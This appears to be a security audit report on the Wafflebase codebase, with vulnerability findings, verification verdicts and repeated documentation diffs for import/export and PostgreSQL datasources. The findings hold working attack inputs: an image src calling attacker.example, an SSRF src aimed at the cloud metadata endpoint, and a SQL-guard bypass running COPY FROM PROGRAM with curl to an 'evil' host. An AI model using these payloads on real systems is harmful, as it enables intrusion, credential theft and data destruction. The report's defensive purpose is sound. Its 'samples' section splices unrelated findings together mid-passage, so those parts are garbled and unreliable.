findings.summary: New PPTX export fetches attacker-controllable image `src` values with `credentials: "include"` and no scheme/host allowlist
findings.evidence: `exportSlidesPptxAndDownload` passes every `ImageElement.data.src` in the deck straight into `docsImageFetcher` (pptx-actions.ts:94). `docsImageFetcher` does `fetch(resolved, { credentials: "include" })` (packages/frontend/src/app/docs/export-utils.ts:51) and `resolveImageUrl` explicitly preserves ANY absolute scheme — `http:`, `https:`, `file:`, `blob:`, `data:` (export-utils.ts:13-15). The `src` is fully attacker-controlled: the content-write boundary validates only `id`/`type`/`frame` on an element and never inspects `data.src` (packages/backend/src/api/v1/docs-content.controller.ts:337-357), so any workspace member or API-key holder can PUT a deck containing `{type:'image', data:{src:'https://attacker.example/beacon'}}`. When a victim opens Export → PowerPoint (.pptx), their browser issues a credentialed request to the attacker's host, disclosing IP/UA/timing, and can be pointed at internal same-origin/intranet URLs for probing. Cookie theft is largely blunted because auth cookies are SameSite=Lax (packages/backend/src/auth/auth.controller.ts:230), which is why confidence is medium rather than high; the unvalidated-URL credentialed fetch itself is still the weakness. The same pattern pre-exists in the PDF path, but this change adds a new consumer of it.

findings.summary: SSRF via unvalidated image `src` in the CLI slides/docs export fetcher that this change promotes as a shipped feature
findings.evidence: `createImageFetcher` resolves relative srcs against the server base but passes any absolute URL through untouched (image-fetcher.ts:28) and then `fetchImpl(resolved)` with no scheme, host, or private-IP restriction (image-fetcher.ts:49). It is wired into `slides export --format pptx` at packages/cli/src/commands/slides.ts:207-208 and the docs export paths at packages/cli/src/commands/docs.ts:269-313. Because deck content accepts arbitrary `data.src` (packages/backend/src/api/v1/docs-content.controller.ts:337), an attacker who can write to a deck plants `src: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"`; when the deck is exported by an automation/CI job on the same network the response bytes are embedded verbatim into the produced `.pptx` media part (packages/slides/src/export/pptx/index.ts:162-165), which the attacker can then read. Pre-existing code, but the change under review documents and advertises this export path (guide/import-export.md "Automating with the CLI").

findings.summary: Read-only SQL guard bypassable: validator strips "comments" the executed query does not have, allowing arbitrary multi-statement SQL on the datasource feature this change newly documents/advertises
findings.evidence: `validateSelectQuery` strips `/*...*/` with a regex BEFORE any string-literal awareness (sql-validator.ts:28-31), but `executeQuery` runs the ORIGINAL, unstripped `dto.query` (datasource.service.ts:150). A `/*` inside a string literal therefore blanks out the middle of the query for the validator while Postgres executes it. Payload (any workspace member — the only gate is `assertMember`, datasource.controller.ts:139-143): `SELECT '/*' AS a) AS q; COPY t FROM PROGRAM 'curl http://evil/$(id)'; SELECT * FROM (SELECT '*/' AS b`. Validator view after comment-strip is `SELECT '' AS b` → first token SELECT, no forbidden keyword, no semicolon → valid. Executed string becomes `SELECT * FROM (SELECT '/*' AS a) AS q; COPY t FROM PROGRAM '...'; SELECT * FROM (SELECT '*/' AS b) AS _q LIMIT 10001` — three syntactically valid statements, giving INSERT/UPDATE/DELETE/DROP/COPY-FROM-PROGRAM against the connection owner's credentials. Pre-existing code; this change adds packages/documentation/sheets/datasources.md and a homepage card promoting the feature as SELECT-only/read-only.

findings.summary: Datasource "SSL" option disables TLS certificate verification (`rejectUnauthorized: false`), while the newly added doc presents it as a security toggle
findings.evidence: `createClient` builds the pg client with `ssl: ds.sslEnabled ? { rejectUnauthorized: false } : false` (datasource.service.ts:204). Enabling SSL therefore encrypts but does not authenticate the server: an attacker on the path between the Wafflebase backend and the customer's PostgreSQL host presents any self-signed certificate and transparently MITMs the connection, capturing the decrypted DB username/password (decrypt() at line 203) and all query results. The change under review adds packages/documentation/sheets/datasources.md:12 ("**SSL** — toggle on if your database requires it"), which tells users to rely on a control that does not validate certificates.

findings.summary: New datasources doc states a security model the code does not enforce: collaborators DO execute queries with the creator's stored credentials
findings.evidence: datasources.md says "The connection belongs to the person who created it. Collaborators can see the query and its last results, but run their own connection to execute it." The backend contradicts this: `POST /datasources/:id/query` gates only on `assertMember(ds.workspaceId, userId)` (packages/backend/src/datasource/datasource.controller.ts:139-144) and then runs the query with the stored, server-decrypted password of the creator (datasource.service.ts:133-152, 203). Any workspace member — including a low-privilege invitee — can run arbitrary SELECTs (and, with the validator bypass above, writes) against the creator's production database. Publishing the opposite as documented behaviour leads self-hosters to store privileged credentials under a false isolation assumption.

findings.summary: Datasource create/update responses return the encrypted password blob unmasked, unlike the read endpoints
findings.evidence: `findAllByWorkspace` (line 66-69) and `findOne` (line 77) deliberately replace `password` with `'********'`, but `create` (line 44-57) and `update` (line 95-98) return the raw Prisma record, so the API response includes the full `iv:authTag:ciphertext` AES-GCM payload (crypto.util.ts:37-41) for any workspace member who creates or edits a datasource. That hands out material for offline attack should `DATASOURCE_ENCRYPTION_KEY` ever leak, and defeats the masking applied everywhere else. Reached via the endpoints at datasource.controller.ts:43, 67, 104; relevant because this change adds the user-facing documentation for the feature.

findings.summary: Legacy `GET /images/:id` is unauthenticated, and it is the endpoint the PPTX/DOCX import path uploads to — imported deck images are world-readable
findings.evidence: `ImageController.get` carries no `@UseGuards(JwtAuthGuard)` and no workspace scoping (image.controller.ts:44-53), unlike the v1 controller which guards with `CombinedAuthGuard, WorkspaceScopeGuard` and prefixes the S3 key with the workspace id (packages/backend/src/api/v1/images.controller.ts:24, 78-97). The frontend PPTX import path uploads every embedded image through `docsImageUploader` → `POST ${BACKEND_BASE}/images` (packages/frontend/src/app/docs/export-utils.ts:31, used by packages/frontend/src/app/slides/pptx-actions.ts:39), i.e. into the UNSCOPED, publicly readable bucket root. Anyone who obtains or brute-scans an image URL (returned as `/images/<uuid>.<ext>`) can read confidential imported slide/document artwork with no session at all. Confidence is low because UUIDv4 keys make this a capability-URL design that may be intentional — but the REST docs touched by this change (developers/rest-api.md:124) describe images as "workspace-scoped", which this endpoint is not.

findings.summary: `safeFilename` (now also used for .pptx) strips only Windows-reserved punctuation, not control characters or bidi overrides
findings.evidence: The sanitizer is `(title || "").replace(/[\\/:*?"<>|]+/g, "_")` (export-utils.ts:151), so a document title containing U+202E (RTL override), other bidi controls, or C0 control characters survives into the `a.download` value at export-utils.ts:65. A deck titled with an RLO can render in the download shelf/file manager with a visually reversed name (classic extension-spoofing presentation), though the real on-disk extension is still forced to `.pptx`. +# Import & Export
+
+Wafflebase reads and writes the file formats your team already uses, so you
+can bring existing work in and take finished work out. Nothing is locked to
+the platform.
+
+## At a glance
+
+| Product | Import | Export |
+|---------|--------|--------|
+| **Sheets** | Excel (`.xlsx`) | — *(CSV/JSON via [CLI](../developers/cli))* |
+| **Docs** | Word (`.docx`) | Word (`.docx`), PDF (`.pdf`) |
+| **Slides** | PowerPoint (`.pptx`) | PowerPoint (`.pptx`), PDF (`.pdf`) |
+
+Import always creates a **new** document; it never overwrites an open one.
+Export downloads a file from the document you are editing.
+
+## Importing files
+
+From your workspace, open the **New** menu and choose an import option:
+
+- **Import XLSX** — creates a new spreadsheet from an Excel workbook. Each
+  sheet in the workbook becomes a tab. Values, formulas, and basic cell
+  formatting are brought across.
+- **Import DOCX** — creates a new document from a Word file, mapping
+  paragraphs, headings, lists, tables, and inline formatting into the editor.
+- **Import PPTX** — creates a new deck from a PowerPoint file: slides,
+  text boxes, shapes, images, tables, and theme colors are converted to
+  native Wafflebase elements.
+
+Large files show a progress indicator while they are parsed and any embedded
+images are uploaded into your workspace.
+
+## Exporting files
+
+### Docs
+
+In the document editor, open the **Export** menu (the download icon in the
+header) and choose:
+
+- **Word (`.docx`)** — the full document, including tables and headers/footers.
+- **PDF (`.pdf`)** — a paginated, print-ready PDF that mirrors the on-screen
+  page layout.
+
+### Slides
+
+In the presentation editor, open the **Export** menu and choose:
+
+- **PowerPoint (`.pptx`)** — an editable deck with slides, shapes, text,
+  images, tables, and the theme preserved as DrawingML.
+- **PDF (`.pdf`)** — one slide per page, ready to share or print.
+
+### Sheets
+
+Spreadsheets export to CSV or JSON through the
+[command-line tool](../developers/cli) (`wafflebase sheets …`). A built-in
+download menu in the grid editor is on the roadmap.
+
+## Fidelity notes
+
+Wafflebase aims for a faithful round-trip, but the source formats are large
+and some constructs have no exact equivalent:
+
+- **PPTX/DOCX import is best-effort.** Common content — text, lists, tables,
+  shapes, images, and theme colors — converts cleanly. Rare or
+  application-specific features (embedded objects, macros, exotic effects) may
+  be simplified or dropped.
+- **Fonts** referenced by an imported file must be available in Wafflebase to
+  render identically; otherwise a close fallback is substituted.
+- **Re-exporting** a file you imported will not be byte-identical to the
+  original, but preserves the structure and content faithfully.
+
+## Automating with the CLI
+
+Every import/export path above is also scriptable. See the
+[CLI reference](../developers/cli) for `docs export`, `docs import`,
+`slides export`, `slides import`, and the `sheets` cell import/export
+commands — useful for batch conversions and pipelines.

+# External Datasources
+
+A **datasource** connects a spreadsheet to an external PostgreSQL database. You
+write a SQL query and its results appear in a read-only tab, right next to your
+regular editable sheets.
+
+## Connect a database
+
+1. Click the **+** at the end of the tab bar and choose **New DataSource**.
+2. In the **Select DataSource** dialog, fill in the connection details:
+   - **Name** — a label for the connection
+   - **Host** and **Port** (defaults to `5432`)
+   - **Database**, **Username**, and **Password**
+   - **SSL** — toggle on if your database requires it
+3. Click **Test Connection** to confirm the credentials work, then save.
+
+A new tab is added with a database icon to distinguish it from sheet tabs.
+
+## Run a query
+
+The datasource tab has a SQL editor at the top and a results grid below it.
+
+1. Type a `SELECT` query — for example, `SELECT * FROM users LIMIT 100`.
+2. Click **Execute**, or press **⌘+Enter** / **Ctrl+Enter**.
+
+The results load into the grid below: the first row holds the column names and
+each following row is a record. Re-run the query with **Execute** whenever you
+want fresh data — results don't refresh automatically.
+
+::: tip
+Queries are capped at 10,000 rows and a 30-second runtime, so add a `LIMIT`
+clause when exploring large tables.
+:::
+
+## Working with results
+
+- The results grid is **read-only** — it reflects the database, so you can't
+  edit, sort, or filter the cells in place. Shape the data with SQL instead.
+- Reference query results from other tabs with formulas, just like any sheet,
+  to build summaries and dashboards on top of live data.
+
+## Good to know
+
+- Datasources connect to **PostgreSQL** databases.
+- The connection belongs to the person who created it. Collaborators can see the
+  query and its last results, but run their own connection to execute it.
+- Only the latest query for a tab is saved.

+# Import & Export
+
+Wafflebase reads and writes the file formats your team already uses, so you
+can bring existing work in and take finished work out. Nothing is locked to
+the platform.
+
+## At a glance
+
+| Product | Import | Export |
+|---------|--------|--------|
+| **Sheets** | Excel (`.xlsx`) | — *(CSV/JSON via [CLI](../developers/cli))* |
+| **Docs** | Word (`.docx`) | Word (`.docx`), PDF (`.pdf`) |
+| **Slides** | PowerPoint (`.pptx`) | PowerPoint (`.pptx`), PDF (`.pdf`) |
+
+Import always creates a **new** document; it never overwrites an open one.
+Export downloads a file from the document you are editing.
+
+## Importing files
+
+From your workspace, open the **New** menu and choose an import option:
+
+- **Import XLSX** — creates a new spreadsheet from an Excel workbook. Each
+  sheet in the workbook becomes a tab. Values, formulas, and basic cell
+  formatting are brought across.
+- **Import DOCX** — creates a new document from a Word file, mapping
+  paragraphs, headings, lists, tables, and inline formatting into the editor.
+- **Import PPTX** — creates a new deck from a PowerPoint file: slides,
+  text boxes, shapes, images, tables, and theme colors are converted to
+  native Wafflebase elements.
+
+Large files show a progress indicator while they are parsed and any embedded
+images are uploaded into your workspace.
+
+## Exporting files
+
+### Docs
+
+In the document editor, open the **Export** menu (the download icon in the
+header) and choose:
+
+- **Word (`.docx`)** — the full document, including tables and headers/footers.
+- **PDF (`.pdf`)** — a paginated, print-ready PDF that mirrors the on-screen
+  page layout.
+
+### Slides
+
+In the presentation editor, open the **Export** menu and choose:
+
+- **PowerPoint (`.pptx`)** — an editable deck with slides, shapes, text,
+  images, tables, and the theme preserved as DrawingML.
+- **PDF (`.pdf`)** — one slide per page, ready to share or print.
+
+### Sheets
+
+Spreadsheets export to CSV or JSON through the
+[command-line tool](../developers/cli) (`wafflebase sheets …`). A built-in
+download menu in the grid editor is on the roadmap.
+
+## Fidelity notes
+
+Wafflebase aims for a faithful round-trip, but the source formats are large
+and some constructs have no exact equivalent:
+
+- **PPTX/DOCX import is best-effort.** Common content — text, lists, tables,
+  shapes, images, and theme colors — converts cleanly. Rare or
+  application-specific features (embedded objects, macros, exotic effects) may
+  be simplified or dropped.
+- **Fonts** referenced by an imported file must be available in Wafflebase to
+  render identically; otherwise a close fallback is substituted.
+- **Re-exporting** a file you imported will not be byte-identical to the
+  original, but preserves the structure and content faithfully.
+
+## Automating with the CLI
+
+Every import/export path above is also scriptable. See the
+[CLI reference](../developers/cli) for `docs export`, `docs import`,
+`slides export`, `slides import`, and the `sheets` cell import/export
+commands — useful for batch conversions and pipelines.

+# External Datasources
+
+A **datasource** connects a spreadsheet to an external PostgreSQL database. You
+write a SQL query and its results appear in a read-only tab, right next to your
+regular editable sheets.
+
+## Connect a database
+
+1. Click the **+** at the end of the tab bar and choose **New DataSource**.
+2. In the **Select DataSource** dialog, fill in the connection details:
+   - **Name** — a label for the connection
+   - **Host** and **Port** (defaults to `5432`)
+   - **Database**, **Username**, and **Password**
+   - **SSL** — toggle on if your database requires it
+3. Click **Test Connection** to confirm the credentials work, then save.
+
+A new tab is added with a database icon to distinguish it from sheet tabs.
+
+## Run a query
+
+The datasource tab has a SQL editor at the top and a results grid below it.
+
+1. Type a `SELECT` query — for example, `SELECT * FROM users LIMIT 100`.
+2. Click **Execute**, or press **⌘+Enter** / **Ctrl+Enter**.
+
+The results load into the grid below: the first row holds the column names and
+each following row is a record. Re-run the query with **Execute** whenever you
+want fresh data — results don't refresh automatically.
+
+::: tip
+Queries are capped at 10,000 rows and a 30-second runtime, so add a `LIMIT`
+clause when exploring large tables.
+:::
+
+## Working with results
+
+- The results grid is **read-only** — it reflects the database, so you can't
+  edit, sort, or filter the cells in place. Shape the data with SQL instead.
+- Reference query results from other tabs with formulas, just like any sheet,
+  to build summaries and dashboards on top of live data.
+
+## Good to know
+
+- Datasources connect to **PostgreSQL** databases.
+- The connection belongs to the person who created it. Collaborators can see the
+  query and its last results, but run their own connection to execute it.
+- Only the latest query for a tab is saved.

samples.summary: New PPTX export fetches attacker-controllable image `src` values with `credentials: "include"` and no scheme/host allowlist
samples.evidence: `exportSlidesPptxAndDownload` passes every `ImageElement.data.src` in the deck straight into `docsImageFetcher` (pptx-actions.ts:94). `docsImageFetcher` does `fetch(resolved, { credentials: "include" })` (packages/frontend/src/app/docs/export-utils.ts:51) and `resolveImageUrl` explicitly preserves ANY absolute scheme — `http:`, `https:`, `file:`, `blob:`, `data:` (export-utils.ts:13-15). The `src` is fully attacker-controlled: the content-write boundary validates only `id`/`type`/`frame` on an element and never inspects `data.src` (packages/backend/src/api/v1/docs-content.controller.ts:337-357), so any workspace member or API-key holder can PUT a deck containing `{type:'image', data:{src:'https://attacker.example/beacon'}}`. When a victim opens Export → PowerPoint (.pptx), their browser issues a credentialed request to the attacker's host, disclosing IP/UA/timing, and can be pointed at internal same-origin/intranet URLs for probing. Cookie theft is largely blunted because auth cookies are SameSite=Lax (packages/backend/src/auth/auth.controller.ts:230), which is why confidence is medium rather than high; the unvalidated-URL credentialed fetch itself is still the weakness. The same pattern pre-exists in the PDF path, but this change adds a new consumer of it.

samples.summary: SSRF via unvalidated image `src` in the CLI slides/docs export fetcher that this change promotes as a shipped feature
samples.evidence: `createImageFetcher` resolves relative srcs against the server base but passes any absolute URL through untouched (image-fetcher.ts:28) and then `fetchImpl(resolved)` with no scheme, host, or private-IP restriction (image-fetcher.ts:49). A `/*` inside a string literal therefore blanks out the middle of the query for the validator while Postgres executes it. Payload (any workspace member — the only gate is `assertMember`, datasource.controller.ts:139-143): `SELECT '/*' AS a) AS q; COPY t FROM PROGRAM 'curl http://evil/$(id)'; SELECT * FROM (SELECT '*/' AS b`. Validator view after comment-strip is `SELECT '' AS b` → first token SELECT, no forbidden keyword, no semicolon → valid. Executed string becomes `SELECT * FROM (SELECT '/*' AS a) AS q; COPY t FROM PROGRAM '...'; SELECT * FROM (SELECT '*/' AS b) AS _q LIMIT 10001` — three syntactically valid statements, giving INSERT/UPDATE/DELETE/DROP/COPY-FROM-PROGRAM against the connection owner's credentials. Pre-existing code; this change adds packages/documentation/sheets/datasources.md and a homepage card promoting the feature as SELECT-only/read-only.

samples.summary: Datasource "SSL" option disables TLS certificate verification (`rejectUnauthorized: false`), while the newly added doc presents it as a security toggle
samples.evidence: `createClient` builds the pg client with `ssl: ds.sslEnabled ? { rejectUnauthorized: false } : false` (datasource.service.ts:204). finding.summary: Read-only SQL guard bypassable: validator strips "comments" the executed query does not have, allowing arbitrary multi-statement SQL on the datasource feature this change newly documents/advertises
finding.evidence: `validateSelectQuery` strips `/*...*/` with a regex BEFORE any string-literal awareness (sql-validator.ts:28-31), but `executeQuery` runs the ORIGINAL, unstripped `dto.query` (datasource.service.ts:150). A `/*` inside a string literal therefore blanks out the middle of the query for the validator while Postgres executes it. Payload (any workspace member — the only gate is `assertMember`, datasource.controller.ts:139-143): `SELECT '/*' AS a) AS q; COPY t FROM PROGRAM 'curl http://evil/$(id)'; SELECT * FROM (SELECT '*/' AS b`. Validator view after comment-strip is `SELECT '' AS b` → first token SELECT, no forbidden keyword, no semicolon → valid. Executed string becomes `SELECT * FROM (SELECT '/*' AS a) AS q; COPY t FROM PROGRAM '...'; SELECT * FROM (SELECT '*/' AS b) AS _q LIMIT 10001` — three syntactically valid statements, giving INSERT/UPDATE/DELETE/DROP/COPY-FROM-PROGRAM against the connection owner's credentials. Pre-existing code; this change adds packages/documentation/sheets/datasources.md and a homepage card promoting the feature as SELECT-only/read-only.

verdict.reason: Confirmed exactly as described. sql-validator.ts:28-31 strips /*...*/ with a non-string-aware lazy regex, and string-literal handling (line 60) happens only afterward and only for the semicolon check. datasource.service.ts:150 then interpolates the ORIGINAL dto.query into `SELECT * FROM (${dto.query}) AS _q LIMIT 10001`, so validator and executor operate on different strings. I traced the stated payload: the lazy regex spans from the `/*` inside the first literal to the first real `*/` (inside the trailing literal — neither `http://` nor `SELECT * FROM` contains `*/`), leaving the validator with `SELECT '' AS b`, which passes the first-token check (38-44), the forbidden-keyword loop (48-57) and the multi-statement check (60-67). The executed string is three valid statements, and client.query() at line 152 is called with no parameter values, so pg uses the simple query protocol which executes multi-statement strings. No compensating control: validateSelectQuery has exactly one caller (service.ts:128), there is no read-only transaction/default_transaction_read_only anywhere (only statement_timeout/TimeZone/DateStyle/lc_monetary at 144-147), and ExecuteQueryDto only bounds length (dto.ts:86-90). Reachable by any workspace member — the only gate is assertMember at controller.ts:139-143 — yielding arbitrary DML/DDL (and COPY FROM PROGRAM given sufficient DB privileges) under the stored credentials. In-lane (injection / bypassable validation gate) and critical.

finding.summary: Datasource "SSL" option disables TLS certificate verification (`rejectUnauthorized: false`), while the newly added doc presents it as a security toggle
finding.evidence: `createClient` builds the pg client with `ssl: ds.sslEnabled ? { rejectUnauthorized: false } : false` (datasource.service.ts:204). Enabling SSL therefore encrypts but does not authenticate the server: an attacker on the path between the Wafflebase backend and the customer's PostgreSQL host presents any self-signed certificate and transparently MITMs the connection, capturing the decrypted DB username/password (decrypt() at line 203) and all query results. The change under review adds packages/documentation/sheets/datasources.md:12 ("**SSL** — toggle on if your database requires it"), which tells users to rely on a control that does not validate certificates.

verdict.reason: The code is present exactly as claimed: datasource.service.ts:204 sets `ssl: ds.sslEnabled ? { rejectUnauthorized: false } : false`, so enabling the SSL toggle encrypts but does not authenticate the PostgreSQL server. createClient() is reachable from testConnection (line 115) and executeQuery (line 138), and it passes the decrypted DB password (decrypt(ds.password), line 203) over that unauthenticated channel. A grep of the backend for sslEnabled/createClient shows no CA configuration, checkServerIdentity, or other compensating guard anywhere, so nothing makes this unreachable or safe. An on-path attacker between the backend and the customer's database can present any self-signed certificate, capture the DB credentials and all query results, and modify responses. Disabled TLS certificate verification falls squarely within the Security lens (crypto/auth: weakened verification), so it is not out of scope. The only inaccuracy in the finding is the doc line number: the "**SSL** — toggle on if your database requires it" text is at packages/documentation/sheets/datasources.md:14, not :12 — a cosmetic discrepancy that does not affect the substance, since the doc does present the toggle as a security control.

finding.summary: New datasources doc states a security model the code does not enforce: collaborators DO execute queries with the creator's stored credentials
finding.evidence: datasources.md says "The connection belongs to the person who created it. Collaborators can see the query and its last results, but run their own connection to execute it." The backend contradicts this: `POST /datasources/:id/query` gates only on `assertMember(ds.workspaceId, userId)` (packages/backend/src/datasource/datasource.controller.ts:139-144) and then runs the query with the stored, server-decrypted password of the creator (datasource.service.ts:133-152, 203). Any workspace member — including a low-privilege invitee — can run arbitrary SELECTs (and, with the validator bypass above, writes) against the creator's production database. Publishing the opposite as documented behaviour leads self-hosters to store privileged credentials under a false isolation assumption.

verdict.reason: Verified against the repo. datasources.md:45-46 does state "The connection belongs to the person who created it. Collaborators can see the query and its last results, but run their own connection to execute it." The code contradicts this: datasource.controller.ts:133-145 gates POST /datasources/:id/query only with workspaceService.assertMember(ds.workspaceId, userId), and workspace.service.ts:167-174 shows assertMember passes for any membership row regardless of role (contrast assertOwner at :177-188, which does check role). datasource.service.ts:127-152 then builds the client via createClient(ds), which at :203 uses password: decrypt(ds.password) with user: ds.username — the creator's stored, server-decrypted credential. ExecuteQueryDto carries only the query, and the frontend (packages/frontend/src/api/datasources.ts:104) just POSTs to the same endpoint, so no per-user connection exists anywhere. Invitees default to role 'member' (workspace.service.ts:107,147) and therefore execute arbitrary queries with the creator's database privileges. No refutation ground applies: the code is present as described, the only guard is the one that fails to distinguish creator from collaborator, and a misdocumented credential-isolation boundary that induces operators to store privileged production credentials falls in the security lane (access control / sensitive data exposure). Not downgraded for the separate validator-bypass claim, which I did not rely on.

finding.summary: Legacy `GET /images/:id` is unauthenticated, and it is the endpoint the PPTX/DOCX import path uploads to — imported deck images are world-readable
finding.evidence: `ImageController.get` carries no `@UseGuards(JwtAuthGuard)` and no workspace scoping (image.controller.ts:44-53), unlike the v1 controller which guards with `CombinedAuthGuard, WorkspaceScopeGuard` and prefixes the S3 key with the workspace id (packages/backend/src/api/v1/images.controller.ts:24, 78-97). The frontend PPTX import path uploads every embedded image through `docsImageUploader` → `POST ${BACKEND_BASE}/images` (packages/frontend/src/app/docs/export-utils.ts:31, used by packages/frontend/src/app/slides/pptx-actions.ts:39), i.e. into the UNSCOPED, publicly readable bucket root. Anyone who obtains or brute-scans an image URL (returned as `/images/<uuid>.<ext>`) can read confidential imported slide/document artwork with no session at all. Confidence is low because UUIDv4 keys make this a capability-URL design that may be intentional — but the REST docs touched by this change (developers/rest-api.md:124) describe images as "workspace-scoped", which this endpoint is not.

verdict.reason: The finding is accurate in every checkable particular. `ImageController.get` (packages/backend/src/image/image.controller.ts:44-53) has no `@UseGuards` and no workspace scoping, while its sibling `upload` (line 29) and `delete` (line 56) handlers do carry `JwtAuthGuard` — so the GET is not covered by any controller-level guard. The only global guard is `ThrottlerGuard` (packages/backend/src/app.module.ts:107-112), so no out-of-controller mechanism re-imposes auth. By contrast the v1 controller guards with `CombinedAuthGuard, WorkspaceScopeGuard` (packages/backend/src/api/v1/images.controller.ts:24) and prefixes the S3 key with the workspace id (lines 29-33, 89, 107). `ImageService.upload` writes to the bucket root when `keyPrefix` is absent and returns `/images/<uuid>.<ext>` (packages/backend/src/image/image.service.ts:93,104); `getObject` does a raw keyed fetch with no scoping (lines 107-115). The frontend import path does use the legacy unscoped route: `docsImageUploader` POSTs to `${BACKEND_BASE}/images` (packages/frontend/src/app/docs/export-utils.ts:31) and is reused verbatim by the PPTX importer (packages/frontend/src/app/slides/pptx-actions.ts:33-40) and DOCX importer (packages/frontend/src/app/docs/docx-actions.ts:16). Net effect: user-uploaded slide/document artwork is retrievable with no session and no workspace membership check — a missing authorization gate on user content, in the access-control lane. UUIDv4 keys make this a capability URL, which is defence-in-depth rather than an access-control gate (and the response is marked `Cache-Control: public, immutable` at line 51, encouraging URL propagation). No guard, interceptor, or middleware exists that would make the endpoint unreachable, so no refutation ground applies.
